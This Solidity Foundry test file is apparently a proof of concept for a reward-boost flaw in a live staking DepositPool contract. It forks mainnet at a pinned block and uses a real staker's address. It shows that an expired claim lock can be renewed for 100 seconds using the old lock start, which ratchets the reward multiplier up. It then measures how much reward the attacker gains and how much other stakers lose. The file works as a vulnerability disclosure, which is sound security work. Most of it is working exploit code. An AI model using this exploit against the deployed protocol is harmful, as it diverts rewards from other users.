// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.20;

interface Vm {
    function clearMockedCalls() external;
    function createSelectFork(string calldata rpcUrl, uint256 blockNumber) external returns (uint256);
    function deal(address account, uint256 newBalance) external;
    function envString(string calldata name) external returns (string memory);
    function expectRevert(bytes calldata revertData) external;
    function mockCall(address callee, bytes calldata data, bytes calldata returnData) external;
    function prank(address sender) external;
    function warp(uint256 newTimestamp) external;
}

interface IDepositPool {
    struct UserData {
        uint128 lastStake;
        uint256 deposited;
        uint256 rate;
        uint256 pendingRewards;
        uint128 claimLockStart;
        uint128 claimLockEnd;
        uint256 virtualDeposited;
        uint128 lastClaim;
        address referrer;
    }

    function claim(uint256 rewardPoolIndex, address receiver) external payable;
    function distributor() external view returns (address);
    function getCurrentUserMultiplier(uint256 rewardPoolIndex, address user) external view returns (uint256);
    function getLatestUserReward(uint256 rewardPoolIndex, address user) external view returns (uint256);
    function lockClaim(uint256 rewardPoolIndex, uint128 claimLockEnd) external;
    function rewardPoolsData(uint256 rewardPoolIndex)
        external
        view
        returns (uint128 lastUpdate, uint256 rate, uint256 totalVirtualDeposited);
    function usersData(address user, uint256 rewardPoolIndex) external view returns (UserData memory);
}

interface IDistributor {
    function distributeRewards(uint256 rewardPoolIndex) external;
    function getDistributedRewards(uint256 rewardPoolIndex, address depositPool) external view returns (uint256);
    function l1Sender() external view returns (address);
}

interface IL1Sender {
    function layerZeroConfig()
        external
        view
        returns (
            address gateway,
            address receiver,
            uint16 receiverChainId,
            address zroPaymentAddress,
            bytes memory adapterParams
        );
}

interface ILayerZeroEndpoint {
    function estimateFees(
        uint16 destinationChainId,
        address userApplication,
        bytes calldata payload,
        bool payInZro,
        bytes calldata adapterParams
    ) external view returns (uint256 nativeFee, uint256 zroFee);

    function getOutboundNonce(uint16 destinationChainId, address sourceAddress) external view returns (uint64);
}

contract ExpiredClaimLockPoC {
    event log_named_uint(string key, uint256 value);

    Vm private constant vm = Vm(address(uint160(uint256(keccak256("hevm cheat code")))));
    IDepositPool private constant POOL = IDepositPool(0x47176B2Af9885dC6C4575d4eFd63895f7Aaa4790);
    address private constant LIVE_STAKER = 0xB13c99b5Df2d72261b6F642f7104438f9D2543aB;
    address private constant NON_STAKER = address(0xBEEF);

    uint256 private constant REWARD_POOL_INDEX = 0;
    uint256 private constant PINNED_BLOCK = 25_978_896;
    uint256 private constant EXPIRY_ADJACENT_BLOCK = 25_530_507;
    uint256 private constant PRECISION = 1e25;
    uint256 private constant FIXED_REWARD = 1_000 ether;

    bytes32 private constant PINNED_PARENT_HASH = 0x3edad51296e447e34f4719bff162f58955fd2811c129fbf009df7a930f0de7ca;

    uint256 private constant DEPOSITED = 8_699_999_999_999_999_998;
    uint256 private constant EXPIRED_VIRTUAL_DEPOSITED = 27_536_439_500_729_018_151;
    uint128 private constant HISTORICAL_LOCK_START = 1_736_133_779;
    uint128 private constant HISTORICAL_LOCK_END = 1_784_027_565;
    uint256 private constant REWARD_AT_EXPIRY = 1_787_424_504_633_942_449_800;
    uint256 private constant REWARD_AT_PINNED_BLOCK = 2_072_153_677_237_986_240_908;
    uint256 private constant POST_EXPIRY_REWARD = 284_729_172_604_043_791_108;
    uint256 private constant POST_EXPIRY_ONE_X_EQUIVALENT = 89_958_754_529_233_869_076;
    uint256 private constant POST_EXPIRY_EXCESS = 194_770_418_074_809_922_032;

    function testLiveHistoricalStateAccruedExactPostExpiryExcess() external {
        _selectFork(EXPIRY_ADJACENT_BLOCK);

        IDepositPool.UserData memory atExpiry = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint256 rewardAtExpiry = POOL.getLatestUserReward(REWARD_POOL_INDEX, LIVE_STAKER);

        require(block.timestamp == uint256(HISTORICAL_LOCK_END) + 2, "fixture is not immediately post-expiry");
        _assertUnchangedLivePosition(atExpiry);
        require(rewardAtExpiry == REWARD_AT_EXPIRY, "unexpected reward at expiry");

        _selectPinnedFork();

        IDepositPool.UserData memory atPinnedBlock = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint256 rewardAtPinnedBlock = POOL.getLatestUserReward(REWARD_POOL_INDEX, LIVE_STAKER);

        _assertUnchangedLivePosition(atPinnedBlock);
        require(atPinnedBlock.claimLockEnd < block.timestamp, "claim lock is not expired");
        require(rewardAtPinnedBlock == REWARD_AT_PINNED_BLOCK, "unexpected pinned reward");

        uint256 actualPostExpiryReward = rewardAtPinnedBlock - rewardAtExpiry;
        uint256 oneXEquivalent = (actualPostExpiryReward * atPinnedBlock.deposited) / atPinnedBlock.virtualDeposited;
        uint256 excessReward = actualPostExpiryReward - oneXEquivalent;

        require(actualPostExpiryReward == POST_EXPIRY_REWARD, "unexpected post-expiry reward");
        require(oneXEquivalent == POST_EXPIRY_ONE_X_EQUIVALENT, "unexpected 1x equivalent");
        require(excessReward == POST_EXPIRY_EXCESS, "unexpected post-expiry excess");

        emit log_named_uint("post_expiry_reward_wei", actualPostExpiryReward);
        emit log_named_uint("post_expiry_one_x_equivalent_wei", oneXEquivalent);
        emit log_named_uint("post_expiry_excess_wei", excessReward);
    }

    function testLiveExpiredUserCanRelockFor100SecondsUsingHistoricalStart() external {
        _selectPinnedFork();

        IDepositPool.UserData memory beforeRelock = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint256 oldMultiplier = POOL.getCurrentUserMultiplier(REWARD_POOL_INDEX, LIVE_STAKER);
        (,, uint256 totalVirtualBefore) = POOL.rewardPoolsData(REWARD_POOL_INDEX);

        require(beforeRelock.claimLockEnd < block.timestamp, "fixture must be in an unlocked gap");
        require(beforeRelock.virtualDeposited > beforeRelock.deposited, "expired boost is absent");

        uint128 shortLockEnd = uint128(block.timestamp + 100);
        vm.prank(LIVE_STAKER);
        POOL.lockClaim(REWARD_POOL_INDEX, shortLockEnd);

        IDepositPool.UserData memory afterRelock = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint256 newMultiplier = POOL.getCurrentUserMultiplier(REWARD_POOL_INDEX, LIVE_STAKER);
        (,, uint256 totalVirtualAfter) = POOL.rewardPoolsData(REWARD_POOL_INDEX);

        require(afterRelock.deposited == beforeRelock.deposited, "principal changed");
        require(afterRelock.claimLockStart == beforeRelock.claimLockStart, "historical start was not reused");
        require(afterRelock.claimLockEnd == shortLockEnd, "100-second relock was not stored");
        require(afterRelock.virtualDeposited > beforeRelock.virtualDeposited, "virtual deposit did not ratchet");
        require(newMultiplier > oldMultiplier, "multiplier did not ratchet");
        require(
            totalVirtualAfter == totalVirtualBefore - beforeRelock.virtualDeposited + afterRelock.virtualDeposited,
            "pool weight was not replaced exactly"
        );

        vm.warp(uint256(shortLockEnd) + 1);
        IDepositPool.UserData memory afterSecondExpiry = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        require(afterSecondExpiry.claimLockEnd < block.timestamp, "short relock did not expire");
        require(afterSecondExpiry.claimLockStart == HISTORICAL_LOCK_START, "expiry cleared historical start");
        require(afterSecondExpiry.virtualDeposited == afterRelock.virtualDeposited, "expiry cleared ratcheted weight");

        emit log_named_uint("old_multiplier_1e25", oldMultiplier);
        emit log_named_uint("new_multiplier_1e25", newMultiplier);
        emit log_named_uint("old_virtual_deposit", beforeRelock.virtualDeposited);
        emit log_named_uint("new_virtual_deposit", afterRelock.virtualDeposited);
    }

    function testLiveExpiredRewardClaimTraversesLayerZeroAndResetsWeight() external {
        _selectPinnedFork();

        IDepositPool.UserData memory beforeClaim = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint256 claimableReward = POOL.getLatestUserReward(REWARD_POOL_INDEX, LIVE_STAKER);
        require(beforeClaim.claimLockEnd < block.timestamp, "fixture claim remains locked");
        require(beforeClaim.virtualDeposited > beforeClaim.deposited, "fixture has no expired boost");
        require(claimableReward == REWARD_AT_PINNED_BLOCK, "unexpected claimable reward");

        (address endpoint, uint16 destinationChainId, address l1Sender, uint256 nativeFee) =
            _quoteLayerZeroFee(claimableReward);
        uint64 outboundNonceBefore = ILayerZeroEndpoint(endpoint).getOutboundNonce(destinationChainId, l1Sender);

        vm.deal(LIVE_STAKER, nativeFee);
        vm.prank(LIVE_STAKER);
        POOL.claim{value: nativeFee}(REWARD_POOL_INDEX, LIVE_STAKER);

        IDepositPool.UserData memory afterClaim = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint64 outboundNonceAfter = ILayerZeroEndpoint(endpoint).getOutboundNonce(destinationChainId, l1Sender);

        require(outboundNonceAfter == outboundNonceBefore + 1, "LayerZero send path was not reached");
        require(afterClaim.deposited == beforeClaim.deposited, "claim changed principal");
        require(afterClaim.pendingRewards == 0, "claim did not consume rewards");
        require(afterClaim.claimLockStart == 0 && afterClaim.claimLockEnd == 0, "claim did not clear lock");
        require(afterClaim.virtualDeposited == afterClaim.deposited, "claim did not reset weight to 1x");
        require(afterClaim.lastClaim == block.timestamp, "claim did not commit");

        emit log_named_uint("layerzero_native_fee_wei", nativeFee);
        emit log_named_uint("claimed_reward_wei", claimableReward);
    }

    function testControlNonStakerCannotCreateClaimLock() external {
        _selectPinnedFork();

        IDepositPool.UserData memory nonStaker = POOL.usersData(NON_STAKER, REWARD_POOL_INDEX);
        require(nonStaker.deposited == 0, "control address unexpectedly staked");

        vm.prank(NON_STAKER);
        vm.expectRevert(bytes("DS: user isn't staked"));
        POOL.lockClaim(REWARD_POOL_INDEX, uint128(block.timestamp + 100));
    }

    function testMockedAccumulatorShowsOtherUserDilutionEqualsAttackerExcess() external {
        _selectPinnedFork();

        IDistributor distributor = IDistributor(POOL.distributor());
        distributor.distributeRewards(REWARD_POOL_INDEX);

        IDepositPool.UserData memory beforeRelock = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        require(beforeRelock.claimLockEnd < block.timestamp, "precondition was not an expired lock");

        uint128 shortLockEnd = uint128(block.timestamp + 100);
        vm.prank(LIVE_STAKER);
        POOL.lockClaim(REWARD_POOL_INDEX, shortLockEnd);

        IDepositPool.UserData memory afterRelock = POOL.usersData(LIVE_STAKER, REWARD_POOL_INDEX);
        uint256 pendingAfterRelock = afterRelock.pendingRewards;
        (,, uint256 boostedTotalVirtual) = POOL.rewardPoolsData(REWARD_POOL_INDEX);

        vm.warp(uint256(shortLockEnd) + 1);
        require(afterRelock.claimLockEnd < block.timestamp, "relock did not expire");

        uint256 distributedBefore = distributor.getDistributedRewards(REWARD_POOL_INDEX, address(POOL));
        vm.mockCall(
            address(distributor),
            abi.encodeWithSelector(IDistributor.getDistributedRewards.selector, REWARD_POOL_INDEX, address(POOL)),
            abi.encode(distributedBefore + FIXED_REWARD)
        );

        uint256 attackerIncrement = POOL.getLatestUserReward(REWARD_POOL_INDEX, LIVE_STAKER) - pendingAfterRelock;
        uint256 accountingShare =
            ((FIXED_REWARD * PRECISION) / boostedTotalVirtual) * afterRelock.virtualDeposited / PRECISION;
        uint256 oneXTotal = boostedTotalVirtual - afterRelock.virtualDeposited + afterRelock.deposited;
        uint256 intendedOneXShare = ((FIXED_REWARD * PRECISION) / oneXTotal) * afterRelock.deposited / PRECISION;

        uint256 roundingDelta = attackerIncrement > accountingShare
            ? attackerIncrement - accountingShare
            : accountingShare - attackerIncrement;
        require(roundingDelta <= 1, "mocked accumulator does not match deployed accounting");
        require(attackerIncrement > intendedOneXShare, "ratcheted boost gives no excess reward");

        uint256 attackerExcess = attackerIncrement - intendedOneXShare;
        uint256 actualOtherUsersShare = FIXED_REWARD - attackerIncrement;
        uint256 intendedOtherUsersShare = FIXED_REWARD - intendedOneXShare;
        uint256 aggregateOtherUserDilution = intendedOtherUsersShare - actualOtherUsersShare;

        require(aggregateOtherUserDilution == attackerExcess, "dilution does not equal attacker excess");

        emit log_named_uint("mocked_total_reward_wei", FIXED_REWARD);
        emit log_named_uint("attacker_increment_wei", attackerIncrement);
        emit log_named_uint("intended_one_x_increment_wei", intendedOneXShare);
        emit log_named_uint("attacker_excess_wei", attackerExcess);
        emit log_named_uint("aggregate_other_user_dilution_wei", aggregateOtherUserDilution);

        vm.clearMockedCalls();
    }

    function _selectFork(uint256 blockNumber) private {
        vm.createSelectFork(vm.envString("ETH_RPC_URL"), blockNumber);
        require(block.number == blockNumber, "fork block mismatch");
    }

    function _selectPinnedFork() private {
        _selectFork(PINNED_BLOCK);
        require(blockhash(PINNED_BLOCK - 1) == PINNED_PARENT_HASH, "fork chain mismatch");
    }

    function _assertUnchangedLivePosition(IDepositPool.UserData memory userData) private pure {
        require(userData.deposited == DEPOSITED, "unexpected live principal");
        require(userData.virtualDeposited == EXPIRED_VIRTUAL_DEPOSITED, "unexpected live virtual deposit");
        require(userData.claimLockStart == HISTORICAL_LOCK_START, "unexpected historical lock start");
        require(userData.claimLockEnd == HISTORICAL_LOCK_END, "unexpected historical lock end");
    }

    function _quoteLayerZeroFee(uint256 rewardAmount)
        private
        view
        returns (address endpoint, uint16 destinationChainId, address l1Sender, uint256 nativeFee)
    {
        IDistributor distributor = IDistributor(POOL.distributor());
        l1Sender = distributor.l1Sender();

        address receiver;
        address zroPaymentAddress;
        bytes memory adapterParams;
        (endpoint, receiver, destinationChainId, zroPaymentAddress, adapterParams) =
            IL1Sender(l1Sender).layerZeroConfig();

        require(endpoint != address(0) && receiver != address(0), "LayerZero config is empty");
        require(zroPaymentAddress == address(0), "fixture unexpectedly pays in ZRO");

        bytes memory payload = abi.encode(LIVE_STAKER, rewardAmount);
        (nativeFee,) =
            ILayerZeroEndpoint(endpoint).estimateFees(destinationChainId, l1Sender, payload, false, adapterParams);
        require(nativeFee > 0, "LayerZero quote is zero");
    }
}
